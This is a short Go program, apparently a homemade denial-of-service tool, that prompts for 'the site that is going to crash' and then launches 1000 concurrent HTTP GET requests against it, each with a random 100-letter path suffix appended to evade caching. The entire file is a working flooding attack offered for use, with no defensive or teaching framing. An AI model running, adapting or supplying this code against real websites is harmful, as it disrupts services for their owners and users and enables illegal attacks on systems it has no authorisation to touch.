package main

import (
	"bytes"
	"fmt"
	"math/rand"
	"net/http"
	"sync"
	"time"
)

func main() {
	randString := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	source := rand.NewSource(time.Now().UnixNano())
	r := rand.New(source)
	var wg sync.WaitGroup
	var userURL string
	fmt.Print("Tell me the site that is going to crash. :")
	fmt.Scanln(&userURL)

	for j := 0; j < 10; j++ {
		for i := 0; i < 100; i++ {
			wg.Add(1)

			go func() {
				defer wg.Done()

				buffer := bytes.NewBufferString(userURL)

				for k := 0; k < 100; k++ {
					randomNumber := r.Intn(52)
					buffer.WriteString(string(randString[randomNumber]))
				}

				url := buffer.String()

				_, err := http.Get(url)
				if err != nil {
					fmt.Println("erorr: ", err)
				}
			}()
		}
	}

	wg.Wait()

	fmt.Println("end :)")
}
